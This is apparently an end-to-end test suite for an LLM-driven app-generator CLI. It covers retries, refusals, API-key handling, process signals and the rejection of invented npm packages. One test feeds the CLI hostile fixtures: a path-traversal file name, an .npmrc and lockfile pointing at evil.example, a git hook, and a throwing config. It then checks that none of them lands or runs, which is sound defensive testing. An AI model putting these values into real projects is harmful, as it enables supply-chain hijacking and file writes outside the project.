// Runs the real CLI against a mock LLM with real npm, Vite and Express.
// The mock replaces only the model: every step after the HTTP response is real.

import assert from 'node:assert/strict';
import { spawn } from 'node:child_process';
import { existsSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import net from 'node:net';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { after, describe, it } from 'node:test';
import { fileURLToPath } from 'node:url';
import { stripVTControlCharacters } from 'node:util';

import { SCRIPTS, VITE_CONFIG } from '../src/policy.js';
import { BROKEN_SERVER, GOOD_SERVER, appFiles, startMockLLM } from './helpers/mock-llm.js';

const CLI = fileURLToPath(new URL('../index.js', import.meta.url));
const cleanup = [];
after(() => Promise.all(cleanup.map((fn) => fn())));

function tempCwd() {
  const dir = mkdtempSync(path.join(tmpdir(), 'ignite-e2e-'));
  cleanup.push(() => rmSync(dir, { recursive: true, force: true, maxRetries: 3 }));
  return dir;
}

async function withMock(replies) {
  const mock = await startMockLLM(replies);
  cleanup.push(mock.close);
  return mock;
}

/** Starts the CLI in its own process group so tests can signal it the way a terminal would. */
function runCli(args, { cwd, env }) {
  const baseEnv = { ...process.env };
  delete baseEnv.ANTHROPIC_API_KEY;
  delete baseEnv.OPENAI_API_KEY;
  const child = spawn(process.execPath, [CLI, ...args], {
    cwd,
    env: { ...baseEnv, HOME: cwd, ...env },
    detached: true,
    stdio: ['ignore', 'pipe', 'pipe'],
  });
  let output = '';
  const append = (chunk) => {
    output += chunk;
  };
  child.stdout.on('data', append);
  child.stderr.on('data', append);
  const exited = new Promise((resolve) => child.once('close', (code, signal) => resolve({ code, signal })));
  return { child, exited, output: () => stripVTControlCharacters(output) };
}

const anthropicEnv = (mock) => ({ ANTHROPIC_API_KEY: 'sk-ant-test-key', ANTHROPIC_BASE_URL: mock.anthropicUrl });
const openaiEnv = (mock) => ({ OPENAI_API_KEY: 'sk-openai-test-key', OPENAI_BASE_URL: mock.openaiUrl });

async function waitFor(check, { timeout = 120_000, label = 'condition' } = {}) {
  const deadline = Date.now() + timeout;
  while (Date.now() < deadline) {
    const value = await check();
    if (value) return value;
    await new Promise((resolve) => setTimeout(resolve, 150));
  }
  throw new Error(`Timed out waiting for ${label}`);
}

const portOpen = (port) =>
  new Promise((resolve) => {
    const socket = net.connect({ port, host: 'localhost' });
    socket.once('connect', () => {
      socket.destroy();
      resolve(true);
    });
    socket.once('error', () => resolve(false));
  });

describe('anthropic: the whole chain', { timeout: 300_000 }, () => {
  it('survives rate limits, a dropped stream, unsafe output and a crashing server, then runs the app', async () => {
    const fenced = (files) => `\`\`\`json\n${JSON.stringify(files)}\n\`\`\``;
    const mock = await withMock([
      { status: 429, headers: { 'retry-after': '1' }, body: { type: 'error', error: { type: 'rate_limit_error', message: 'Slow down' } } },
      { text: '{"package.json":"partial', midStreamError: true },
      { text: JSON.stringify(appFiles({ '../../escaped.txt': 'pwned' })) },
      {
        text: fenced(
          appFiles({
            'server/index.js': BROKEN_SERVER,
            '.npmrc': 'registry=https://evil.example/',
            '.git/hooks/pre-commit': 'touch PWNED_HOOK',
            'package-lock.json': '{"resolved":"https://evil.example"}',
            'vite.config.js': 'throw new Error("model config must not run")',
          }),
        ),
      },
      { text: JSON.stringify({ 'server/index.js': GOOD_SERVER }) },
    ]);

    const cwd = tempCwd();
    const run = runCli(['Build', 'a', 'collaborative', 'to-do', 'list'], {
      cwd,
      env: { ...anthropicEnv(mock), MY_SECRET_TOKEN: 'canary-value' },
    });
    cleanup.push(() => {
      try {
        process.kill(-run.child.pid, 'SIGKILL');
      } catch {}
    });

    const url = await waitFor(() => run.output().match(/Your app is live[\s\S]*?(http:\/\/localhost:\d+)/)?.[1], {
      label: `the dev server URL. Output so far:\n${run.output()}`,
      timeout: 240_000,
    });

    const root = path.join(cwd, 'collaborative-to-do-list');

    // Every scripted reply was consumed, so each failure above really happened.
    assert.equal(mock.remaining(), 0);
    assert.equal(mock.requests.length, 5);

    // The request matches the current Anthropic API, and the key arrives.
    const first = mock.requests[0];
    assert.ok(first.headers['x-api-key'] === 'sk-ant-test-key' || first.headers.authorization === 'Bearer sk-ant-test-key');
    assert.match(first.url, /\/v1\/messages/);
    assert.equal(first.body.model, 'claude-opus-5-5');
    assert.equal(first.body.stream, true);
    assert.equal(first.body.max_tokens, 64000);
    assert.deepEqual(first.body.output_config, { effort: 'low' });
    assert.equal(first.body.fallbacks, 'default');
    assert.match(first.headers['anthropic-beta'], /server-side-fallback-2026-07-01/);
    assert.match(first.body.system, /single JSON object/);
    assert.match(first.body.messages[0].content, /<app_request>\nBuild a collaborative to-do list\n<\/app_request>/);
    for (const banned of ['temperature', 'top_p', 'top_k', 'thinking']) assert.equal(banned in first.body, false, banned);

    // The chain carried the right context from step to step.
    assert.match(mock.requests[3].body.messages[0].content, /Unsafe file path/);
    const fix = mock.requests[4].body.messages[0].content;
    assert.match(fix, /fails at the "server boot" stage/);
    assert.match(fix, /<current_files>/);
    assert.match(fix, /app\.get\('\*'/);

    // The unsafe path was never written.
    assert.equal(existsSync(path.join(cwd, 'escaped.txt')), false);
    assert.equal(existsSync(path.join(root, '../../escaped.txt')), false);

    // Dropped files stayed out, and nothing the model scripted ever ran.
    for (const absent of ['.npmrc', '.git', 'PWNED_PREINSTALL', 'PWNED_POSTINSTALL', 'PWNED_DEV', 'PWNED_HOOK']) {
      assert.equal(existsSync(path.join(root, absent)), false, absent);
    }
    assert.notEqual(JSON.parse(readFileSync(path.join(root, 'package-lock.json'), 'utf8')).resolved, 'https://evil.example');

    // The tool owns the parts that run automatically.
    const manifest = JSON.parse(readFileSync(path.join(root, 'package.json'), 'utf8'));
    assert.deepEqual(manifest.scripts, SCRIPTS);
    assert.equal(manifest.name, 'collaborative-to-do-list');
    assert.equal('overrides' in manifest, false);
    assert.equal(manifest.dependencies.react, '^19.3.1');
    assert.equal(manifest.dependencies['left-pad'], 'latest');
    assert.equal(readFileSync(path.join(root, 'vite.config.js'), 'utf8'), VITE_CONFIG);

    // The fix landed on disk.
    assert.equal(readFileSync(path.join(root, 'server/index.js'), 'utf8'), GOOD_SERVER);

    // The app is genuinely up: Vite serves the page and proxies to the real API.
    const page = await fetch(url);
    assert.equal(page.status, 200);
    assert.match(await page.text(), /id="root"/);
    assert.equal((await fetch(`${url}/src/App.jsx`)).status, 200);
    assert.deepEqual(await (await fetch(`${url}/api/health`)).json(), { ok: true });

    // The named wildcard the system prompt prescribes works on the pinned Express.
    assert.equal(await (await fetch(`${url}/api/some/unknown/route`)).text(), 'spa fallback');

    // Output is plain when it isn't going to a terminal, so logs stay readable.
    assert.doesNotMatch(run.output(), /[◒◐◓◑]/);

    // WebSockets pass through the Vite proxy, which collaborative apps depend on.
    const greeting = await new Promise((resolve, reject) => {
      const socket = new WebSocket(`${url.replace('http', 'ws')}/api/ws`);
      socket.onmessage = (event) => {
        socket.close();
        resolve(event.data);
      };
      socket.onerror = () => reject(new Error('The WebSocket did not connect through the proxy'));
    });
    assert.equal(greeting, 'hello from the api');

    // The generated app cannot read the keys or tokens from the user's environment.
    assert.deepEqual(await (await fetch(`${url}/api/env`)).json(), { anthropic: null, openai: null, canary: null, hasPath: true });

    // The user can see what happened along the way.
    const output = run.output();
    assert.match(output, /Packages chosen by the model: left-pad, nanoid/);
    assert.match(output, /The server boot step failed/);
    assert.match(output, /Skipped \.npmrc/);

    // Ctrl-C reaches the whole process group and leaves nothing listening.
    const port = Number(new URL(url).port);
    process.kill(-run.child.pid, 'SIGINT');
    const { code } = await run.exited;
    assert.equal(code, 0);
    await waitFor(async () => !(await portOpen(port)), { timeout: 10_000, label: 'the Vite port to close' });
    assert.match(run.output(), /Stopped\. Restart it with/);
  });

  it('stops the dev server when only the CLI process receives SIGTERM', async () => {
    const mock = await withMock([{ text: JSON.stringify(appFiles()) }]);
    const cwd = tempCwd();
    const run = runCli(['a', 'tiny', 'app'], { cwd, env: anthropicEnv(mock) });
    cleanup.push(() => {
      try {
        process.kill(-run.child.pid, 'SIGKILL');
      } catch {}
    });

    const url = await waitFor(() => run.output().match(/Your app is live[\s\S]*?(http:\/\/localhost:\d+)/)?.[1], {
      label: 'the dev server URL',
      timeout: 200_000,
    });
    const port = Number(new URL(url).port);
    assert.equal(await portOpen(port), true);

    run.child.kill('SIGTERM');
    const outcome = await Promise.race([run.exited, new Promise((resolve) => setTimeout(() => resolve('hung'), 20_000))]);
    assert.notEqual(outcome, 'hung', 'the CLI did not exit within 20s of SIGTERM');
    await waitFor(async () => !(await portOpen(port)), { timeout: 10_000, label: 'the Vite port to close' });
  });
});

describe('openai', { timeout: 120_000 }, () => {
  it('uses the Responses API in JSON mode and writes the files', async () => {
    const mock = await withMock([{ text: JSON.stringify(appFiles()) }]);
    const cwd = tempCwd();
    const run = runCli(['--no-install', 'a', 'notes', 'app'], { cwd, env: openaiEnv(mock) });
    const { code } = await run.exited;
    assert.equal(code, 0, run.output());

    const [request] = mock.requests;
    assert.equal(request.url, '/v1/responses');
    assert.equal(request.headers.authorization, 'Bearer sk-openai-test-key');
    assert.equal(request.body.model, 'gpt-6-astra');
    assert.equal(request.body.stream, true);
    assert.equal(request.body.store, false);
    assert.equal(request.body.max_output_tokens, 64000);
    assert.deepEqual(request.body.text, { format: { type: 'json_object' } });
    assert.deepEqual(request.body.reasoning, { effort: 'low' });
    assert.match(request.body.instructions, /single JSON object/);
    assert.match(request.body.input, /JSON/);

    assert.equal(existsSync(path.join(cwd, 'notes-app', 'src/App.jsx')), true);
    assert.equal(existsSync(path.join(cwd, 'notes-app', 'node_modules')), false);
    assert.match(run.output(), /1\.0k input and 2\.0k output tokens/);
  });

  it('asks for a compact version when the output is cut off', async () => {
    const mock = await withMock([{ text: '{"package.json":"part', incomplete: 'max_output_tokens' }, { text: JSON.stringify(appFiles()) }]);
    const cwd = tempCwd();
    const run = runCli(['--no-install', 'big', 'app'], { cwd, env: openaiEnv(mock) });
    const { code } = await run.exited;
    assert.equal(code, 0, run.output());
    assert.match(mock.requests[1].body.input, /cut off/);
    assert.match(mock.requests[1].body.input, /more compactly/);
  });

  it('retries a response.failed event, then succeeds', async () => {
    const mock = await withMock([
      { events: [{ type: 'response.failed', response: { id: 'r', status: 'failed', error: { code: 'server_error', message: 'Something broke' } } }] },
      { text: JSON.stringify(appFiles()) },
    ]);
    const cwd = tempCwd();
    const run = runCli(['--no-install', 'retry', 'app'], { cwd, env: openaiEnv(mock) });
    const { code } = await run.exited;
    assert.equal(code, 0, run.output());
    assert.equal(mock.requests.length, 2);
  });

  it('does not retry a response.failed event for an empty balance', async () => {
    const mock = await withMock([
      { events: [{ type: 'response.failed', response: { id: 'r', status: 'failed', error: { code: 'insufficient_quota', message: 'No credit left' } } }] },
    ]);
    const run = runCli(['--no-install', 'an', 'app'], { cwd: tempCwd(), env: openaiEnv(mock) });
    const { code } = await run.exited;
    assert.equal(code, 1);
    assert.equal(mock.requests.length, 1);
    assert.match(run.output(), /No credit left/);
  });

  it('reports a refusal event without retrying', async () => {
    const mock = await withMock([
      { events: [{ type: 'response.refusal.done', refusal: 'I cannot help with that', item_id: 'm', output_index: 0, content_index: 0 }] },
    ]);
    const run = runCli(['--no-install', 'an', 'app'], { cwd: tempCwd(), env: openaiEnv(mock) });
    const { code } = await run.exited;
    assert.equal(code, 1);
    assert.equal(mock.requests.length, 1);
    assert.match(run.output(), /I cannot help with that/);
  });

  it('fails immediately and clearly on an empty balance', async () => {
    const mock = await withMock([{ status: 429, body: { error: { code: 'insufficient_quota', message: 'You exceeded your current quota' } } }]);
    const cwd = tempCwd();
    const run = runCli(['--no-install', 'an', 'app'], { cwd, env: openaiEnv(mock) });
    const { code } = await run.exited;
    assert.equal(code, 1);
    assert.equal(mock.requests.length, 1);
    assert.match(run.output(), /You exceeded your current quota/);
    assert.match(run.output(), /billing/);
  });
});

describe('failure handling', { timeout: 120_000 }, () => {
  const expectFailure = async (replies, pattern, args = ['--no-install', 'an', 'app']) => {
    const mock = await withMock(replies);
    const cwd = tempCwd();
    const run = runCli(args, { cwd, env: anthropicEnv(mock) });
    const { code } = await run.exited;
    assert.equal(code, 1, run.output());
    assert.match(run.output(), pattern);
    return { mock, run, cwd };
  };

  it('gives one clear message for a bad API key, with no retries', async () => {
    const { mock } = await expectFailure(
      [{ status: 401, body: { type: 'error', error: { type: 'authentication_error', message: 'invalid x-api-key' } } }],
      /invalid x-api-key[\s\S]*Check that your API key/,
    );
    assert.equal(mock.requests.length, 1);
  });

  for (const message of ['fallbacks: Extra inputs are not permitted', 'Unexpected value(s) `server-side-fallback-2026-07-01` for the `anthropic-beta` header.']) {
    it(`continues without the refusal fallback when an endpoint says: ${message}`, async () => {
      const mock = await withMock([
        { status: 400, body: { type: 'error', error: { type: 'invalid_request_error', message } } },
        { text: JSON.stringify(appFiles()) },
      ]);
      const cwd = tempCwd();
      const run = runCli(['--no-install', 'an', 'app'], { cwd, env: anthropicEnv(mock) });
      const { code } = await run.exited;
      assert.equal(code, 0, run.output());

      assert.equal(mock.requests.length, 2);
      assert.equal(mock.requests[0].body.fallbacks, 'default');
      assert.equal('fallbacks' in mock.requests[1].body, false);
      assert.doesNotMatch(mock.requests[1].headers['anthropic-beta'] ?? '', /server-side-fallback/);
      assert.deepEqual(mock.requests[1].body.output_config, { effort: 'low' });
      assert.equal(existsSync(path.join(cwd, 'app', 'src/App.jsx')), true);
    });
  }

  it('remembers that the fallback was rejected for later requests in the same run', async () => {
    const mock = await withMock([
      { status: 400, body: { type: 'error', error: { type: 'invalid_request_error', message: 'fallbacks: Extra inputs are not permitted' } } },
      { text: 'not json' },
      { text: JSON.stringify(appFiles()) },
    ]);
    const run = runCli(['--no-install', 'an', 'app'], { cwd: tempCwd(), env: anthropicEnv(mock) });
    const { code } = await run.exited;
    assert.equal(code, 0, run.output());
    assert.equal(mock.requests.length, 3);
    assert.equal('fallbacks' in mock.requests[2].body, false);
  });

  it('does not resend on an unrelated bad request', async () => {
    const { mock } = await expectFailure(
      [{ status: 400, body: { type: 'error', error: { type: 'invalid_request_error', message: 'max_tokens: too large' } } }],
      /max_tokens: too large/,
    );
    assert.equal(mock.requests.length, 1);
  });

  it('explains an unknown model', async () => {
    await expectFailure(
      [{ status: 404, body: { type: 'error', error: { type: 'not_found_error', message: 'model: nope' } } }],
      /model: nope[\s\S]*--model/,
    );
  });

  it('reports a refusal instead of parsing it', async () => {
    const { mock } = await expectFailure([{ text: '', stopReason: 'refusal' }], /declined this request/);
    assert.equal(mock.requests.length, 1);
  });

  it('gives up after repeated unusable output and writes nothing', async () => {
    const { mock, cwd } = await expectFailure(
      [{ text: 'not json' }, { text: 'still not json' }, { text: '{"also":"missing required files"}' }],
      /did not produce usable output after 3 tries/,
    );
    assert.equal(mock.requests.length, 3);
    assert.equal(existsSync(path.join(cwd, 'app')), false);
  });

  it('fails before spending tokens when --dir is occupied', async () => {
    const mock = await withMock([]);
    const run = runCli(['--no-install', '--dir', '.', 'an', 'app'], { cwd: path.dirname(CLI), env: anthropicEnv(mock) });
    const { code } = await run.exited;
    assert.equal(code, 1);
    assert.equal(mock.requests.length, 0);
    assert.match(run.output(), /not empty/);
  });

  it('cancels the model request on Ctrl-C and exits with 130', async () => {
    const mock = await withMock([{ text: '{"package.json":"partial', hang: true }]);
    const cwd = tempCwd();
    const run = runCli(['--no-install', 'an', 'app'], { cwd, env: anthropicEnv(mock) });
    await waitFor(() => mock.requests.length === 1, { timeout: 10_000, label: 'the request to start' });
    await new Promise((resolve) => setTimeout(resolve, 300));

    process.kill(-run.child.pid, 'SIGINT');
    const { code } = await run.exited;
    assert.equal(code, 130, run.output());
    await waitFor(() => mock.requests[0].closedEarly, { timeout: 5000, label: 'the HTTP stream to close' });
    assert.equal(existsSync(path.join(cwd, 'app')), false);
  });

  it('explains how to set a key when there is none and no terminal to ask at', async () => {
    const cwd = tempCwd();
    const run = runCli(['an', 'app'], { cwd, env: {} });
    const { code } = await run.exited;
    assert.equal(code, 1);
    assert.match(run.output(), /Set ANTHROPIC_API_KEY or OPENAI_API_KEY/);
  });
});

describe('dev server output', { timeout: 120_000 }, () => {
  const HARNESS = fileURLToPath(new URL('./helpers/dev-output-harness.js', import.meta.url));

  /** Runs the harness on a project, with its stdout discarded as a user's would scroll away. */
  const measure = (cwd, env = process.env) =>
    new Promise((resolve, reject) => {
      const child = spawn(process.execPath, [HARNESS, cwd], { env, stdio: ['ignore', 'ignore', 'pipe'] });
      let stderr = '';
      child.stderr.on('data', (chunk) => {
        stderr += chunk;
      });
      child.once('close', () => {
        const match = stderr.match(/RESULT (.*)/);
        if (match) resolve(JSON.parse(match[1]));
        else reject(new Error(`The harness reported nothing: ${stderr}`));
      });
    });

  // Logs far more than the memory limit below, so retaining it could not pass. The
  // URL is split across two writes, and its end arrives glued to a large log chunk.
  const noisyApp = () => {
    const cwd = tempCwd();
    writeFileSync(path.join(cwd, 'package.json'), JSON.stringify({ name: 'noisy', private: true, scripts: { dev: 'node emit.js' } }));
    writeFileSync(
      path.join(cwd, 'emit.js'),
      `const chunk = Buffer.alloc(64 * 1024, 'log line\\n');
const total = 400 * 1024 * 1024;
let sent = 0;
const pump = () => {
  while (sent < total) {
    sent += chunk.length;
    if (!process.stdout.write(chunk)) return process.stdout.once('drain', pump);
  }
};
process.stdout.write('  Local:   http://localhost:51');
setTimeout(() => {
  process.stdout.write(Buffer.concat([Buffer.from('73/\\n'), chunk]));
  pump();
}, 200);
`,
    );
    return cwd;
  };

  it('does not keep the output in memory, and finds a URL split across writes', async () => {
    const { peakRss, urls, code } = await measure(noisyApp());
    assert.equal(code, 0);
    assert.deepEqual(urls, ['http://localhost:5173/']);
    const peakMiB = peakRss / 1024 / 1024;
    assert.ok(peakMiB < 200, `Peak RSS was ${Math.round(peakMiB)} MiB after 400 MiB of output`);
  });

  it('reports a failure to start instead of crashing when npm cannot be found', async () => {
    const cwd = noisyApp();
    const { error, code, urls } = await measure(cwd, { ...process.env, PATH: path.join(cwd, 'no-such-directory') });
    assert.equal(error, 'ENOENT');
    assert.equal(code, null);
    assert.deepEqual(urls, []);
  });
});

describe('dependency check', { timeout: 120_000 }, () => {
  it('sends invented packages back to the model before installing them', async () => {
    const made = `ignite-definitely-not-real-${Date.now()}`;
    const withFake = appFiles();
    const pkg = JSON.parse(withFake['package.json']);
    pkg.dependencies[made] = '^1.0.0';
    withFake['package.json'] = JSON.stringify(pkg);

    const mock = await withMock([{ text: JSON.stringify(withFake) }, { text: JSON.stringify({ 'package.json': appFiles()['package.json'] }) }]);
    const cwd = tempCwd();
    const run = runCli(['--no-start', 'a', 'fake', 'dep', 'app'], { cwd, env: anthropicEnv(mock) });
    const { code } = await run.exited;
    assert.equal(code, 0, run.output());

    assert.match(mock.requests[1].body.messages[0].content, new RegExp(`do not exist on npm: ${made}`));
    const manifest = JSON.parse(readFileSync(path.join(cwd, 'fake-dep-app', 'package.json'), 'utf8'));
    assert.equal(made in manifest.dependencies, false);
  });
});
